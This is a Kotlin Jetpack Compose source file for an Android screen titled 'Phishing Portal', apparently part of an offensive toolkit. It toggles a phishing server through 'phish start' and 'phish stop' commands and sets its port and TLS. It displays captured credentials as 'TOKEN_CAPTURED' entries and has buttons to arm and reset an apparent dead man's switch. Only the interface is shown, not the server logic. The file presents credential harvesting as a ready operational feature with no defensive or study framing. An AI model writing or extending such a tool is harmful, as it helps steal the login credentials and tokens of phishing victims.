package com.spartanai.nova.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.spartanai.nova.core.NovaOrchestrator
import com.spartanai.nova.ui.theme.*

@Composable
fun PhishingScreen() {
    val orchestrator = NovaOrchestrator.getInstance()
    val settings by orchestrator.settings.collectAsState()
    var isServerActive by remember { mutableStateOf(false) }
    val capturedData by orchestrator.capturedCredentials.collectAsState()

    Box(modifier = Modifier.fillMaxSize().background(HoloBlack)) {
        Column(modifier = Modifier.fillMaxSize().padding(16.dp)) {
            Text("PHISHING PORTAL", style = MaterialTheme.typography.headlineMedium, color = HoloCyan)
            Text("Sovereign Hosting & Payload Ingestion Hub", style = MaterialTheme.typography.bodySmall, color = Color.Gray)

            Spacer(modifier = Modifier.height(24.dp))

            // Manual Server Controls
            Card(
                modifier = Modifier.fillMaxWidth(),
                colors = CardDefaults.cardColors(containerColor = if (isServerActive) HoloCyan.copy(alpha = 0.1f) else HoloDarkBlue.copy(alpha = 0.3f)),
                border = androidx.compose.foundation.BorderStroke(1.dp, if (isServerActive) HoloCyan else HoloCyanTrans)
            ) {
                Column(modifier = Modifier.padding(16.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween
                    ) {
                        Column {
                            Text("SOVEREIGN INSTANCE", style = MaterialTheme.typography.labelMedium, color = if (isServerActive) HoloGreen else HoloBlue)
                            Text("ENDPOINT: https://auth.spartan.apex", style = MaterialTheme.typography.bodySmall, color = Color.Gray)
                        }
                        Switch(
                            checked = isServerActive, 
                            onCheckedChange = { 
                                isServerActive = it
                                orchestrator.executeCommand(if (it) "phish start" else "phish stop")
                            },
                            colors = SwitchDefaults.colors(checkedThumbColor = HoloCyan, checkedTrackColor = HoloBlue)
                        )
                    }
                    
                    Spacer(modifier = Modifier.height(12.dp))
                    HorizontalDivider(color = HoloCyanTrans, thickness = 0.5.dp)
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    SettingsTextField(
                        label = "Custom Listening Port",
                        value = settings.phishingServerPort.toString(),
                        onValueChange = { orchestrator.updateSettings(settings.copy(phishingServerPort = it.toIntOrNull() ?: 8080)) }
                    )
                    SettingsSwitch(
                        label = "Enforce TLS/SSL Layer",
                        checked = settings.phishingSslEnabled,
                        onCheckedChange = { orchestrator.updateSettings(settings.copy(phishingSslEnabled = it)) }
                    )
                }
            }

            Spacer(modifier = Modifier.height(24.dp))

            Text("INGESTED PAYLOADS", style = MaterialTheme.typography.labelLarge, color = HoloBlue)
            Spacer(modifier = Modifier.height(8.dp))
            
            LazyColumn(modifier = Modifier.weight(1f)) {
                items(capturedData) { data ->
                    Card(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                        colors = CardDefaults.cardColors(containerColor = HoloDarkBlue.copy(alpha = 0.2f)),
                        border = androidx.compose.foundation.BorderStroke(0.5.dp, HoloGreen.copy(alpha = 0.3f))
                    ) {
                        Column(modifier = Modifier.padding(12.dp)) {
                            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                                Text("TOKEN_CAPTURED", style = MaterialTheme.typography.labelSmall, color = HoloGreen)
                                Text("0x${data.hashCode().toString(16).uppercase()}", style = MaterialTheme.typography.labelSmall, color = Color.Gray)
                            }
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                text = data,
                                style = MaterialTheme.typography.bodySmall,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                color = HoloWhite
                            )
                        }
                    }
                }
                if (capturedData.isEmpty()) {
                    item {
                        Box(modifier = Modifier.fillMaxSize().padding(top = 40.dp), contentAlignment = Alignment.Center) {
                            Text("Awaiting inbound sovereign connection...", color = Color.DarkGray, style = MaterialTheme.typography.bodySmall)
                        }
                    }
                }
            }


            Spacer(modifier = Modifier.height(16.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                Button(
                    onClick = { orchestrator.armDMS(5) },
                    modifier = Modifier.weight(1f),
                    colors = ButtonDefaults.buttonColors(containerColor = HoloCyan.copy(alpha = 0.2f)),
                    border = androidx.compose.foundation.BorderStroke(1.dp, HoloCyan)
                ) {
                    Text("ARM DMS (5M)", color = HoloCyan, fontSize = 10.sp)
                }
                Button(
                    onClick = { orchestrator.resetDMS() },
                    modifier = Modifier.weight(1f),
                    colors = ButtonDefaults.buttonColors(containerColor = HoloBlue.copy(alpha = 0.2f)),
                    border = androidx.compose.foundation.BorderStroke(1.dp, HoloBlue)
                ) {
                    Text("RESET DMS", color = HoloBlue, fontSize = 10.sp)
                }
            }
        }
    }
}


